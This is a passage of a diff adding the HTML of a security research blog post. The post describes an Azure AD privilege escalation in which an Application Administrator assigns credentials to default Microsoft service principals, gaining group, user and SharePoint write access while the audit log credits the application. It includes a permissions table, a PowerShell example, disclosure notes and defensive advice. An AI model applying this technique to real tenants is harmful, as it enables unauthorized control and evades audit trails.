+      <td><strong>Group.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Teams Services</td>
+      <td>cc15fd57-2c6c-4117-a88c-83b1d56b4bbe</td>
+      <td><strong>Sites.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Teams Services</td>
+      <td>cc15fd57-2c6c-4117-a88c-83b1d56b4bbe</td>
+      <td><strong>Group.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Office 365 Exchange Online</td>
+      <td>00000002-0000-0ff1-ce00-000000000000</td>
+      <td><strong>Group.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Office 365 Portal</td>
+      <td>00000006-0000-0ff1-ce00-000000000000</td>
+      <td><strong>User.ReadWrite.All</strong></td>
+    </tr>
+    <tr>
+      <td>Microsoft Office 365 Portal</td>
+      <td>00000006-0000-0ff1-ce00-000000000000</td>
+      <td><strong>AuditLog.Read.All</strong></td>
+    </tr>
+    <tr>
+      <td>Azure AD Identity Governance Insights</td>
+      <td>58c746b0-a0b0-4647-a8f6-12dde5981638</td>
+      <td><strong>AuditLog.Read.All</strong></td>
+    </tr>
+    <tr>
+      <td>Kaizala Sync Service</td>
+      <td>d82073ec-4d7c-4851-9c5d-5d97a911d71d</td>
+      <td><strong>Group.ReadWrite.All</strong></td>
+    </tr>
+  </tbody>
+</table>
+
+<p>So the TL;DR is that if you compromise an Application Administrator account or the on-premise Sync Account you can read and modify directory settings, group memberships, user accounts, SharePoint sites and OneDrive files. This is done by assigning credentials to an existing service principal with these permissions and then impersonating these applications.</p>
+
+<p>You can exploit this by assigning a password or <a href="https://docs.microsoft.com/en-us/powershell/azure/active-directory/signing-in-service-principal?view=azureadps-2.0">certificate</a> to a service principal and then logging in as that service principal. I use Python for logging in with a service principal password since the PowerShell module doesn’t support this (it does support certificates but that’s more complex to set up).</p>
+
+<p>The below command shows that when logging in with such a certificate, we do have the power to modify group memberships (something the application admin normally doesn’t have):</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\&gt; add-azureadgroupmember -RefObjectId 2730f622-db95-4b40-9be7-6d72b6c1dad4 -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
+PS C:\&gt; Get-AzureADGroupMember -ObjectId 3cf7196f-9d57-48ee-8912-dbf50803a4d8
+
+ObjectId                             DisplayName UserPrincipalName                 UserType
+--------                             ----------- -----------------                 --------
+2730f622-db95-4b40-9be7-6d72b6c1dad4 Mark        mark@bobswrenches.onmicrosoft.com Member
+</code></pre></div></div>
+
+<p>In the Azure AD audit log, the actions are shown as performed by “Microsoft StaffHub”, and thus nothing in the log indicates these actions were actually performed by the application administrator.</p>
+
+<h1 id="thoughts-and-disclosure-process">Thoughts and disclosure process</h1>
+<p>I don’t really see why credentials can be assigned to default service principals this way and what a possible legitimate purpose would be of this. In my opinion, it shouldn’t be possible to assign credentials to first-party Microsoft applications. The Azure portal doesn’t offer this option and does not display these “backdoor” service principals credentials, but the API’s such as the Microsoft Graph and Azure AD Graph have no such limitations.</p>
+
+<p>When I reported the fact that a privilege escalation is still possible this way (even after I was told it was fixed last year) I got a reply back from MSRC stating that Application Administrators assigning credentials to applications and obtaining more rights is documented and thus not a vulnerability.</p>
+
+<p>If you are administering an Azure AD environment I recommend implementing checks for credentials being assigned to default service principals and to regularly review who control the credentials of applications with high privileges.</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+
+
+        
+          <p class="page__date"><strong><svg class="svg-inline--fa fa-calendar-alt fa-w-14 fa-fw" aria-hidden="true" data-prefix="fas" data-icon="calendar-alt" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M436 160H12c-6.6 0-12-5.4-12-12v-36c0-26.5 21.5-48 48-48h48V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h128V12c0-6.6 5.4-12 12-12h40c6.6 0 12 5.4 12 12v52h48c26.5 0 48 21.5 48 48v36c0 6.6-5.4 12-12 12zM12 192h424c6.6 0 12 5.4 12 12v260c0 26.5-21.5 48-48 48H48c-26.5 0-48-21.5-48-48V204c0-6.6 5.4-12 12-12zm116 204c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12H76c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm128 128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40zm0-128c0-6.6-5.4-12-12-12h-40c-6.6 0-12 5.4-12 12v40c0 6.6 5.4 12 12 12h40c6.6 0 12-5.4 12-12v-40z"></path></svg><!-- <i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> --> Updated:</strong> <time datetime="2019-09-16T19:08:57+00:00">September 16, 2019</time></p>
+        
+      </footer>
+
+      <section class="page__share">
+  
+
+  <a href="https://twitter.com/intent/tweet?text=Azure+AD+privilege+escalation+-+Taking+over+default+application+permissions+as+Application+Admin%20https%3A%2F%2Fdirkjanm.io%2Fazure-ad-privilege-escalation-application-admin%2F" class="btn btn--twitter" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Twitter"><svg class="svg-inline--fa fa-twitter fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="twitter" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" data-fa-i2svg=""><path fill="currentColor" d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"></path></svg><!-- <i class="fab fa-fw fa-twitter" aria-hidden="true"></i> --><span> Twitter</span></a>
+
+  <a href="https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdirkjanm.io%2Fazure-ad-privilege-escalation-application-admin%2F" class="btn btn--facebook" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Facebook"><svg class="svg-inline--fa fa-facebook fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="facebook" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M448 56.7v398.5c0 13.7-11.1 24.7-24.7 24.7H309.1V306.5h58.2l8.7-67.6h-67v-43.2c0-19.6 5.4-32.9 33.5-32.9h35.8v-60.5c-6.2-.8-27.4-2.7-52.2-2.7-51.6 0-87 31.5-87 89.4v49.9h-58.4v67.6h58.4V480H24.7C11.1 480 0 468.9 0 455.3V56.7C0 43.1 11.1 32 24.7 32h398.5c13.7 0 24.8 11.1 24.8 24.7z"></path></svg><!-- <i class="fab fa-fw fa-facebook" aria-hidden="true"></i> --><span> Facebook</span></a>
+
+  <a href="https://plus.google.com/share?url=https%3A%2F%2Fdirkjanm.io%2Fazure-ad-privilege-escalation-application-admin%2F" class="btn btn--google-plus" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on Google Plus"><svg class="svg-inline--fa fa-google-plus fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="google-plus" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M248 8C111.1 8 0 119.1 0 256s111.1 248 248 248 248-111.1 248-248S384.9 8 248 8zm-70.7 372c-68.8 0-124-55.5-124-124s55.2-124 124-124c31.3 0 60.1 11 83 32.3l-33.6 32.6c-13.2-12.9-31.3-19.1-49.4-19.1-42.9 0-77.2 35.5-77.2 78.1s34.2 78.1 77.2 78.1c32.6 0 64.9-19.1 70.1-53.3h-70.1v-42.6h116.9c1.3 6.8 1.9 13.6 1.9 20.7 0 70.8-47.5 121.2-118.8 121.2zm230.2-106.2v35.5H372v-35.5h-35.5v-35.5H372v-35.5h35.5v35.5h35.2v35.5h-35.2z"></path></svg><!-- <i class="fab fa-fw fa-google-plus" aria-hidden="true"></i> --><span> Google+</span></a>
+
+  <a href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3A%2F%2Fdirkjanm.io%2Fazure-ad-privilege-escalation-application-admin%2F" class="btn btn--linkedin" onclick="window.open(this.href, 'window', 'left=20,top=20,width=500,height=500,toolbar=1,resizable=0'); return false;" title="Share on LinkedIn"><svg class="svg-inline--fa fa-linkedin fa-w-14 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="linkedin" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M416 32H31.9C14.3 32 0 46.5 0 64.3v383.4C0 465.5 14.3 480 31.9 480H416c17.6 0 32-14.5 32-32.3V64.3c0-17.8-14.4-32.3-32-32.3zM135.4 416H69V202.2h66.5V416zm-33.2-243c-21.3 0-38.5-17.3-38.5-38.5S80.9 96 102.2 96c21.2 0 38.5 17.3 38.5 38.5 0 21.3-17.2 38.5-38.5 38.5zm282.1 243h-66.4V312c0-24.8-.5-56.7-34.5-56.7-34.6 0-39.9 27-39.9 54.9V416h-66.4V202.2h63.7v29.2h.9c8.9-16.8 30.6-34.5 62.9-34.5 67.2 0 79.7 44.3 79.7 101.9V416z"></path></svg><!-- <i class="fab fa-fw fa-linkedin" aria-hidden="true"></i> --><span> LinkedIn</span></a>
+</section>
+
+
+      
+  <nav class="pagination">
+    
+      <a href="/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/" class="pagination--pager" title="Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin
+">Previous</a>
+    
+    
+      <a href="/office-365-network-attacks-via-insecure-reply-url/" class="pagination--pager" title="Office 365 network attacks - Gaining access to emails and files via an insecure Reply URL
+">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+    </div>
+
+    
+
+    <div class="page__footer">
+      <footer>
+        
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+    
+    
+    
+      <li><a href="https://github.com/dirkjanm"><svg class="svg-inline--fa fa-github fa-w-16 fa-fw" aria-hidden="true" data-prefix="fab" data-icon="github" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512" data-fa-i2svg=""><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"></path></svg><!-- <i class="fab fa-fw fa-github" aria-hidden="true"></i> --> GitHub</a></li>
+    
+    
+    
+    <li><a href="/feed.xml"><svg class="svg-inline--fa fa-rss-square fa-w-14 fa-fw" aria-hidden="true" data-prefix="fas" data-icon="rss-square" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" data-fa-i2svg=""><path fill="currentColor" d="M400 32H48C21.49 32 0 53.49 0 80v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V80c0-26.51-21.49-48-48-48zM112 416c-26.51 0-48-21.49-48-48s21.49-48 48-48 48 21.49 48 48-21.49 48-48 48zm157.533 0h-34.335c-6.011 0-11.051-4.636-11.442-10.634-5.214-80.05-69.243-143.92-149.123-149.123-5.997-.39-10.633-5.431-10.633-11.441v-34.335c0-6.535 5.468-11.777 11.994-11.425 110.546 5.974 198.997 94.536 204.964 204.964.352 6.526-4.89 11.994-11.425 11.994zm103.027 0h-34.334c-6.161 0-11.175-4.882-11.427-11.038-5.598-136.535-115.204-246.161-251.76-251.76C68.882 152.949 64 147.935 64 141.774V107.44c0-6.454 5.338-11.664 11.787-11.432 167.83 6.025 302.21 141.191 308.205 308.205.232 6.449-4.978 11.787-11.432 11.787z"></path></svg><!-- <i class="fas fa-fw fa-rss-square" aria-hidden="true"></i> --> Feed</a></li>
+    <li><a rel="license" href="http://creativecommons.org/licenses/by/4.0/"><img alt="Creative Commons License" style="border-width:0" src="/assets/img/cc-by.png"></a></li>
+  </ul>
+</div>
+
+<div class="page__footer-copyright">All blog content is available under the <a rel="license" href="http://creativecommons.org/licenses/by/4.0/">Creative Commons BY 4.0 License</a> unless stated otherwise.
+  <br>Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> and a modified version of the "Minimal Mistakes" theme.</div>
+
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+  <script src="https://use.fontawesome.com/releases/v5.2.0/js/all.js"></script>
+
+
+
+
+
+
+
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-G3JYRDGZVR"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-G3JYRDGZVR', { 'anonymize_ip': false});
+</script>
+
+
+
+
+
+
+
+  
+</body></html>
